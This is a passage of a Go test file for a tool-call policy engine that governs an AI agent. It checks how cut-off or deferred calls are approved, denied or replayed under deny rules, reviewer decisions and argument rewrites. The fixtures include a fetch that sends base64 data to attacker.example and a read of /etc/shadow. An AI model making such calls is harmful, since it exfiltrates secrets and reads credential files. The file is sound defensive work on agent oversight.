		{Call: fc("fetch", "web_fetch", `{"url":"https://attacker.example/?d=c2VjcmV0"}`), Reason: agentturn.PendingUnknown},
		{Call: fc("shadow", "read", `{"path":"/etc/shadow"}`), Reason: agentturn.PendingUnknown},
		{Call: fc("notes", "read", `{"path":"/home/me/notes"}`), Reason: agentturn.PendingAborted, Tool: tools["read"]},
		{Call: fc("ls", "list", `{"path":"/"}`), Reason: agentturn.PendingUnknown},
	}}
	var reviewed []string
	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
		reviewed = append(reviewed, fmt.Sprintf("%s %v %s", info.Call.CallID, v.Action, v.Reason))
		return Review{Outcome: Approved, By: ByHuman}, nil
	})
	answers, err := e.Answers(ctx, reviewer, end)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{fmt.Sprintf("fetch %v approval required by web_fetch", agentturn.Defer)}; !reflect.DeepEqual(reviewed, want) {
		t.Errorf("reviewed = %q, want %q", reviewed, want)
	}
	const denied = "The call was cut off before it finished and may have run; it was not run again. Denied by policy: denied by read(/etc:*). Do not pursue the same outcome through a workaround, indirect execution or policy circumvention."
	want := []agentturn.Answer{
		agentturn.Approve("fetch").WithBy(ByHuman),
		agentturn.Output(openresponses.NewFunctionCallOutput("shadow", denied)).WithBy(ByPolicy).WithReason("denied by read(/etc:*)"),
		agentturn.Approve("notes").WithBy(ByPolicy).WithReason("run again: replay safe; allowed by read"),
		agentturn.ApproveWith("ls", json.RawMessage(`{"path":"/srv"}`)).WithBy(ByPolicy).WithReason("run again: replay safe; allowed by list"),
	}
	if !reflect.DeepEqual(answers, want) {
		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
	}
}

// A cut-off call is decided on the arguments it would run with: those
// of the dispatch it repeats, else the model's, and then a hook's
// rewrite, which the reviewer is shown beside the verdict about it. A
// rewrite of a keyed call's arguments is not run again, since Resume
// would refuse it under the key of the dispatch it repeats. (#50, #57)
func TestAnswersCutOffDecidesTheArgumentsThatRun(t *testing.T) {
	ctx := context.Background()
	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
	replays := func(name string, r agenttool.Replay) agenttool.Tool {
		return agenttool.New(name, "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return r }))
	}
	tools := map[string]agenttool.Tool{"web_fetch": replays("web_fetch", agenttool.ReplaySafe), "remind": replays("remind", agenttool.ReplayKeyed)}
	lookup := func(name string) (agenttool.Tool, bool) {
		tool, ok := tools[name]
		return tool, ok
	}
	matchers := map[string]ToolMatcher{"web_fetch": {Match: PrefixMatcher("url")}}
	pol := Policy{
		Ask:     []Rule{{Tool: "web_fetch", Spec: "https://mirror.internal/:*"}},
		Deny:    []Rule{{Tool: "web_fetch", Spec: "https://blocked.internal/:*"}},
		Default: Allow(),
	}
	// The host's proxy sends example.com to its mirror, and a reminder
	// is reworded.
	proxy := func(_ context.Context, info agentturn.ToolCallInfo) (*agentturn.ToolDecision, error) {
		switch {
		case info.Call.Name == "remind":
			return &agentturn.ToolDecision{Args: json.RawMessage(`{"text":"reworded"}`)}, nil
		case strings.Contains(string(info.Args), "https://example.com/"):
			return &agentturn.ToolDecision{Args: json.RawMessage(strings.Replace(string(info.Args), "https://example.com/", "https://mirror.internal/", 1))}, nil
		}
		return nil, nil
	}
	e, err := Build(pol, matchers, WithTools(lookup), WithHooks(proxy))
	if err != nil {
		t.Fatal(err)
	}
	fc := func(id, name, args string) *openresponses.FunctionCall {
		return &openresponses.FunctionCall{CallID: id, Name: name, Arguments: args}
	}
	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{
		// A person approved the fetch pointed elsewhere, and the host
		// has denied that host since.
		{Call: fc("approved", "web_fetch", `{"url":"https://public.example/a"}`), Reason: agentturn.PendingAborted, Args: json.RawMessage(`{"url":"https://blocked.internal/a"}`)},
		// The proxy rewrites the fetch to the mirror the policy asks about.
		{Call: fc("proxied", "web_fetch", `{"url":"https://example.com/status"}`), Reason: agentturn.PendingAborted},
		{Call: fc("keyed", "remind", `{"text":"call mum"}`), Reason: agentturn.PendingAborted, IdempotencyKey: "r/keyed"},
	}}
	var reviewed []string
	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
		reviewed = append(reviewed, fmt.Sprintf("%s %s %s", info.Call.CallID, info.Args, v.Reason))
		return Review{Outcome: Approved}, nil
	})
	answers, err := e.Answers(ctx, reviewer, end)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{`proxied {"url":"https://mirror.internal/status"} approval required by web_fetch(https://mirror.internal/:*)`}; !reflect.DeepEqual(reviewed, want) {
		t.Errorf("reviewed = %q, want %q", reviewed, want)
	}
	const (
		denied = "The call was cut off before it finished and may have run; it was not run again. Denied by policy: denied by web_fetch(https://blocked.internal/:*). Do not pursue the same outcome through a workaround, indirect execution or policy circumvention."
		cut    = "The call was cut off before it finished and may have run; it was not run again."
	)
	want := []agentturn.Answer{
		agentturn.Output(openresponses.NewFunctionCallOutput("approved", denied)).WithBy(ByPolicy).WithReason("denied by web_fetch(https://blocked.internal/:*)"),
		agentturn.ApproveWith("proxied", json.RawMessage(`{"url":"https://mirror.internal/status"}`)).WithBy(ByAgent),
		agentturn.Output(openresponses.NewFunctionCallOutput("keyed", cut)).WithBy(ByPolicy).WithReason("not run again: a hook rewrote the arguments, and replay is keyed for the rewrite"),
	}
	if !reflect.DeepEqual(answers, want) {
		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
	}
}

// A deferred call held after its dispatch that may run again is the
// reviewer's to approve, as any deferred call is.
func TestAnswersReviewsDispatchedHoldThatMayRunAgain(t *testing.T) {
	ctx := context.Background()
	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
	read := agenttool.New("read", "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return agenttool.ReplaySafe }))
	e, err := Build(Policy{Default: Ask()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonInputRequired, Pending: []agentturn.PendingCall{
		{Call: &openresponses.FunctionCall{CallID: "held", Name: "read", Arguments: `{}`}, Reason: agentturn.PendingDeferred, Tool: read, Dispatched: true},
	}}
	var reviewed []string
	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, _ Verdict) (Review, error) {
		reviewed = append(reviewed, info.Call.CallID)
		return Review{Outcome: Approved}, nil
	})
	answers, err := e.Answers(ctx, reviewer, end)
	if err != nil || !reflect.DeepEqual(answers, []agentturn.Answer{agentturn.Approve("held").WithBy(ByAgent)}) || strings.Join(reviewed, ",") != "held" {
		t.Errorf("answers = %s, %v, reviewed %v", dump(answers), err, reviewed)
	}
}

// A reviewer that says a rule answered is read to the model as the
// policy, not as a reviewer that looked at the call.
func TestAnswersRefusalNamesWhoAnswered(t *testing.T) {
	ctx := context.Background()
	const tail = ". Do not pursue the same outcome through a workaround, indirect execution or policy circumvention."
	for _, tt := range []struct {
		by   string
		text string
	}{
		{"", "Denied by reviewer: no pushes on Fridays" + tail},
		{ByAgent, "Denied by reviewer: no pushes on Fridays" + tail},
		{ByHuman, "Denied by reviewer: no pushes on Fridays" + tail},
		{ByPolicy, "Denied by policy: no pushes on Fridays" + tail},
	} {
		e, err := Build(Policy{Default: Ask()}, nil)
		if err != nil {
			t.Fatal(err)
		}
		reviewer := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
			return Review{Outcome: Refused, Reason: "no pushes on Fridays", By: tt.by}, nil
		})
		c := &openresponses.FunctionCall{CallID: "call_1", Name: "bash", Arguments: `{}`}
		answers, err := e.Answers(ctx, reviewer, pendingEnd("r", c))
		if err != nil {
			t.Fatal(err)
		}
		if len(answers) != 1 || answers[0].Output == nil || answers[0].Output.Output.Text != tt.text {
			t.Errorf("by %q: answers = %s, want %q", tt.by, dump(answers), tt.text)
		}
	}
}

// A reviewer's approval of a call that may have run, with arguments
// other than those the call would run with, is refused unless the
// tool says the rewrite is safe to run, since Resume refuses a keyed
// call run again with other arguments under its dispatch's key. The
// refusal is the engine's and does not count toward the bound. (#62)
func TestAnswersRefusesAReviewersRewriteOfACallThatMayHaveRun(t *testing.T) {
	ctx := context.Background()
	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
	replays := func(name string, r agenttool.Replay) agenttool.Tool {
		return agenttool.New(name, "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return r }))
	}
	edit := replays("edit", agenttool.ReplayKeyed)
	read := replays("read", agenttool.ReplaySafe)
	fc := func(name, args string) *openresponses.FunctionCall {
		return &openresponses.FunctionCall{CallID: "c1", Name: name, Arguments: args}
	}
	const (
		cut     = "The call was cut off before it finished and may have run; it was not run again."
		rewrote = "not run again: the reviewer rewrote the arguments, and replay is keyed for the rewrite"
	)
	tests := []struct {
		name    string
		pending agentturn.PendingCall
		args    json.RawMessage
		want    agentturn.Answer
		// verdict is the verdict's action and reason; counted says the
		// answer counts toward the bound.
		verdict string
		counted bool
	}{
		{
			name:    "aborted, keyed, rewritten",
			pending: agentturn.PendingCall{Call: fc("edit", `{"path":"notes.md"}`), Reason: agentturn.PendingAborted, Tool: edit, IdempotencyKey: "r/c1"},
			args:    json.RawMessage(`{"path":"other.md"}`),
			want:    agentturn.Output(openresponses.NewFunctionCallOutput("c1", cut)).WithBy(ByPolicy).WithReason(rewrote),
			verdict: fmt.Sprintf("%v %s", agentturn.Block, rewrote),
		},
		{
			name:    "held after its dispatch, keyed, rewritten",
			pending: agentturn.PendingCall{Call: fc("edit", `{"path":"notes.md"}`), Reason: agentturn.PendingDeferred, Dispatched: true, Tool: edit, IdempotencyKey: "r/c1"},
			args:    json.RawMessage(`{"path":"other.md"}`),
			want:    agentturn.Output(openresponses.NewFunctionCallOutput("c1", cut)).WithBy(ByPolicy).WithReason(rewrote),
			verdict: fmt.Sprintf("%v %s", agentturn.Block, rewrote),
		},
		{
			// The dispatch ran arguments a decision rewrote; the reviewer
			// is held to those, not the model's.
			name:    "rewritten back to the model's arguments",
			pending: agentturn.PendingCall{Call: fc("edit", `{"path":"notes.md"}`), Reason: agentturn.PendingAborted, Tool: edit, IdempotencyKey: "r/c1", Args: json.RawMessage(`{"path":"/srv/notes.md"}`)},
			args:    json.RawMessage(`{"path":"notes.md"}`),
			want:    agentturn.Output(openresponses.NewFunctionCallOutput("c1", cut)).WithBy(ByPolicy).WithReason(rewrote),
			verdict: fmt.Sprintf("%v %s", agentturn.Block, rewrote),
		},
		{
			name:    "the same value spelled differently",
			pending: agentturn.PendingCall{Call: fc("edit", `{"path":"notes.md"}`), Reason: agentturn.PendingAborted, Tool: edit, IdempotencyKey: "r/c1"},
			args:    json.RawMessage(`{ "path" : "notes.md" }`),
			want:    agentturn.ApproveWith("c1", json.RawMessage(`{ "path" : "notes.md" }`)).WithBy(ByAgent),
			verdict: fmt.Sprintf("%v approved by reviewer", agentturn.Allow),
			counted: true,
		},
		{
			name:    "the tool says the rewrite is safe",
			pending: agentturn.PendingCall{Call: fc("read", `{"path":"notes.md"}`), Reason: agentturn.PendingAborted, Tool: read},
			args:    json.RawMessage(`{"path":"other.md"}`),
			want:    agentturn.ApproveWith("c1", json.RawMessage(`{"path":"other.md"}`)).WithBy(ByAgent),
			verdict: fmt.Sprintf("%v approved by reviewer", agentturn.Allow),
			counted: true,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			j := &journal{}
			// Consecutive 1: an approval that counts resets nothing, and
			// a refusal that counts would trip the bound at once.
			e, err := Build(Policy{Default: Ask()}, nil, WithObserver(j.observe), WithDenialBound(DenialBound{Consecutive: 1}))
			if err != nil {
				t.Fatal(err)
			}
			reviewed := 0
			reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
				reviewed++
				if v.Action != agentturn.Defer {
					t.Errorf("reviewer saw %+v", v)
				}
				return Review{Outcome: Approved, Args: tc.args}, nil
			})
			end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{tc.pending}}
			answers, err := e.Answers(ctx, reviewer, end)
			if err != nil {
				t.Fatal(err)
			}
			if reviewed != 1 || !reflect.DeepEqual(answers, []agentturn.Answer{tc.want}) {
				t.Errorf("answers = %s (reviewed %d)\nwant %s", dump(answers), reviewed, dump([]agentturn.Answer{tc.want}))
			}
			// The one verdict is the answer's: the policy's ask went to
			// the reviewer and was not observed. The refusal is the
			// engine's, by policy; an approval is the reviewer's.
			vs := j.all()
			if len(vs) != 1 {
				t.Fatalf("verdicts = %+v", vs)
			}
			v := vs[0]
			wantBy := ByPolicy
			if tc.counted {
				wantBy = ByAgent
			}
			if got := fmt.Sprintf("%v %s", v.Action, v.Reason); got != tc.verdict || v.CallID != "c1" || v.Rule != nil || v.By != wantBy {
				t.Errorf("verdict = %+v, want %q by %q", v, tc.verdict, wantBy)
			}
			// A refusal the engine makes on its own does not count: a
			// second review still reaches the reviewer unbounded.
			if _, err := e.Answers(ctx, reviewer, end); errors.Is(err, ErrDenialBound) {
				t.Errorf("the refusal counted toward the bound")
			}
		})
	}
}

// A reviewer's refusal, timeout or failure on a call that may have run
// tells the model so, and does not say the call did not run; the
// answer carries the verdict's reason. (#51)
func TestAnswersCutOffNonApprovalsSayTheCallMayHaveRun(t *testing.T) {
	ctx := context.Background()
	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
	read := agenttool.New("read", "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return agenttool.ReplaySafe }))
	const cut = "The call was cut off before it finished and may have run; it was not run again."
	tests := []struct {
		name   string
		rev    Review
		err    error
		text   string
		by     string
		reason string
	}{
		{
			name:   "refused",
			rev:    Review{Outcome: Refused, Reason: "not now", Note: "ask again tomorrow"},
			text:   cut + " Denied by reviewer: not now. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.",
			by:     ByAgent,
			reason: "denied by reviewer: not now",
		},
		{
			name:   "refused by policy",
			rev:    Review{Outcome: Refused, Reason: "no edits on Fridays", By: ByPolicy},
			text:   cut + " Denied by policy: no edits on Fridays. Do not pursue the same outcome through a workaround, indirect execution or policy circumvention.",
			by:     ByPolicy,
			reason: "denied by reviewer: no edits on Fridays",
		},
		{
			name:   "timed out",
			rev:    Review{Outcome: TimedOut},
			text:   cut + " The reviewer did not answer in time.",
			by:     ByPolicy,
			reason: "reviewer timed out",
		},
		{
			name:   "failed",
			err:    errors.New("model unavailable"),
			text:   cut + " The reviewer could not evaluate the call.",
			by:     ByPolicy,
			reason: "reviewer failed: model unavailable",
		},
	}
	for _, shape := range []struct {
		name    string
		pending agentturn.PendingCall
	}{
		{"aborted", agentturn.PendingCall{Call: &openresponses.FunctionCall{CallID: "c1", Name: "read", Arguments: `{}`}, Reason: agentturn.PendingAborted, Tool: read}},
		{"held after its dispatch", agentturn.PendingCall{Call: &openresponses.FunctionCall{CallID: "c1", Name: "read", Arguments: `{}`}, Reason: agentturn.PendingDeferred, Dispatched: true, Tool: read}},
	} {
		for _, tc := range tests {
			t.Run(shape.name+"/"+tc.name, func(t *testing.T) {
				j := &journal{}
				e, err := Build(Policy{Default: Ask()}, nil, WithObserver(j.observe))
				if err != nil {
					t.Fatal(err)
				}
				reviewer := ReviewerFunc(func(context.Context, agentturn.ToolCallInfo, Verdict) (Review, error) {
					return tc.rev, tc.err
				})
				end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{shape.pending}}
				answers, err := e.Answers(ctx, reviewer, end)
				if err != nil {
					t.Fatal(err)
				}
				want := agentturn.Output(openresponses.NewFunctionCallOutput("c1", tc.text)).WithNote(tc.rev.Note).WithBy(tc.by).WithReason(tc.reason)
				if !reflect.DeepEqual(answers, []agentturn.Answer{want}) {
					t.Errorf("answers = %s\nwant %s", dump(answers), dump([]agentturn.Answer{want}))
				}
				vs := j.all()
				if v := vs[len(vs)-1]; v.Action != agentturn.Block || v.Reason != tc.reason || v.By != tc.by {
					t.Errorf("verdict = %+v", v)
				}
			})
		}
	}
}
